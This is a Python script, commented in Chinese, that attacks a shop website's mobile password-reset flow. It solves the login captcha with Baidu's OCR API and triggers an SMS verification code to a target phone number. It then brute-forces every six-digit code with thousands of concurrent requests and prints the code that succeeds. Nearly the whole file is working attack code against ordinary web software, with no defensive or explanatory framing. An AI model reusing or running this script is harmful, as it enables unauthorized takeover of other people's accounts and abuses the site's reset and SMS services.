import  requests
from PIL import Image
import io
import base64
import time
import threading

def codefenxi(img):
    #通过百度接口分析验证码
    # 百度OCR API
    api_key = ' '
    api_secret = ' '

    # 获取token
    host = 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=' + api_key + '&client_secret=' + api_secret
    # print(host)
    headers = {
        'Content-Type': 'application/json;charset=UTF-8'
    }

    res = requests.get(url=host, headers=headers).json()

    token = res['access_token']

    imgByteArr = io.BytesIO()
    img.save(imgByteArr, format='PNG')
    image_data = imgByteArr.getvalue()
    base64_data = base64.b64encode(image_data)
    r = requests.post('https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic',
                      params={'access_token': token}, data={'image': base64_data})
    result = ''
    for i in r.json()['words_result']:
        result += i['words']
    print(result)
    return result

def tijiao(num,session):
    #提交验证码
    datamessfrom = {
        'act':'validate',
        'mobile_code':num,
        'email_code':'',
        'validate_type':'mobile_phone'
    }
    url3 = "http://shop.xxxxx.cn/mobile/findPwd.php?XDEBUG_SESSION_START=ECLIPSE_DBGP"

    third = session.post(url3,data=datamessfrom)
    # print(num)
    # print(third.text)
    if not third.text.find("error"):
        print(num)
        print(third.text)



def main():
    #获取验证码
    url = "http://shop.xxxxxx.cn/mobile/captcha.php?is_login=1&"
    session = requests.Session()
    codeimg = session.get(url,stream=True)
    # print(f)
    #保存验证码到本地
    save = open('f:/1.png','wb+')
    save.write(codeimg.content)
    save.close()
    #读取验证码并分析
    img = Image.open("f:/1.png")
    code = codefenxi(img)


    #设置发送短线手机号码
    tel = "1381189xxxx"

    #请求验证页
    datafrom = {
              'u_name':tel,
              'captcha':code,
              'act':'check_username'
    }
    url = "http://shop.xxxxxx.cn/mobile/findPwd.php"
    first = session.post(url,data=datafrom)

    #获取短信验证码（只要动作不要结果）
    url2 = "http://shop.xxxxxx.cn/mobile/validate.php?XDEBUG_SESSION_START=ECLIPSE_DBGP"
    dataphonefrom = {
        'act':'send_mobile_code'
    }
    second = session.post(url2,data=dataphonefrom)

    # # 提交验证码
    #
    # tijiao(num,session)

    #多线程
    for j in range (100,1000):
        threads = []
        for i in range (1,1000):
            t = threading.Thread(target=tijiao,args=(j*1000+i,session))
            threads.append(t)

        for t in threads:
            # t.setDaemon(True)
            t.start()
            time.sleep(0.002)
        time.sleep(0.5)
        print("第%s波次",(j))




main()
